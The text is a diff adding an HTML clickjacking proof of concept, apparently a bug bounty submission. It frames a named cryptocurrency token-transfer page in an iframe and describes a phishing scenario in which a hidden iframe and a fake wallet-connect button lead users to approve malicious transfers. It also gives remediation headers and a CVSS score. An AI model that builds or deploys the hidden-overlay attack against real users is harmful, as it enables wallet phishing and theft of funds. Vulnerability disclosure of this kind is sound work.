@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking PoC by ph4ntom404 - Immutable Toolkit Token Transfer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f0f0f0;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+        }
+        .warning {
+            background-color: #fff3cd;
+            border: 1px solid #ffc107;
+            color: #856404;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+        .iframe-container {
+            position: relative;
+            width: 100%;
+            height: 900px;
+            border: 2px solid #007bff;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 0, 0, 0.1);
+            pointer-events: none;
+            z-index: 10;
+        }
+        .info {
+            background-color: #d1ecf1;
+            border: 1px solid #bee5eb;
+            color: #0c5460;
+            padding: 15px;
+            border-radius: 4px;
+            margin-top: 20px;
+        }
+        .vulnerable {
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 4px;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 Clickjacking Vulnerability PoC</h1>
+        <h2>Target: Immutable Toolkit – Transfer Tokens Page</h2>
+        
+        <div class="warning">
+            <strong>⚠️ WARNING:</strong> This is a proof of concept demonstration only. 
+            This page shows that https://toolkit.immutable.com/transfer-tokens/ is vulnerable to clickjacking due to missing X-Frame-Options or CSP frame-ancestors headers.
+        </div>
+        
+        <div class="vulnerable">
+            🔴 CRITICAL: The token transfer wallet connection page can be framed, enabling severe phishing and potential asset drainage.
+        </div>
+        
+        <h3>Demonstration</h3>
+        <p>The iframe below fully embeds the official Immutable Toolkit token transfer page, including the wallet connection prompt. 
+        In a real attack, the iframe would be invisible, and a fake button would overlay the real "Connect Wallet" to trick users.</p>
+        
+        <div class="iframe-container">
+            <iframe src="https://toolkit.immutable.com/transfer-tokens/" 
+                    title="Immutable Toolkit Token Transfer"
+                    sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation allow-popups allow-modals">
+            </iframe>
+            <div class="overlay"></div>
+        </div>
+        
+        <div class="info">
+            <h4>📋 Attack Scenario</h4>
+            <ol>
+                <li>Attacker creates a phishing page embedding the real transfer tool in a hidden iframe</li>
+                <li>Overlays a fake "Connect Wallet to Transfer Your Assets" button over the real one</li>
+                <li>User believes they are on a legitimate Immutable tool</li>
+                <li>User clicks → unknowingly connects wallet and may approve malicious transfers</li>
+                <li>Attacker drains tokens or compromises funds</li>
+            </ol>
+            
+            <h4>🛡️ Remediation</h4>
+            <p>Urgently add:</p>
+            <ul>
+                <li><strong>X-Frame-Options: DENY</strong></li>
+                <li>or <strong>Content-Security-Policy: frame-ancestors 'none'</strong></li>
+            </ul>
+            
+            <h4>📊 Impact</h4>
+            <ul>
+                <li>High-risk wallet phishing during asset transfer</li>
+                <li>Potential direct financial loss for users</li>
+                <li>Token drainage and wallet compromise</li>
+                <li>Major damage to Immutable platform trust</li>
+            </ul>
+        </div>
+        
+        <div class="info">
+            <h4>🔍 Technical Details</h4>
+            <p><strong>Target URL:</strong> https://toolkit.immutable.com/transfer-tokens/</p>
+            <p><strong>Vulnerability:</strong> Missing anti-clickjacking headers on wallet interaction page</p>
+            <p><strong>CVSS Score:</strong> 9.6 (Critical)</p>
+            <p><strong>CVSS Vector:</strong> CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H</p>
+        </div>
+    </div>
+</body>
+</html>
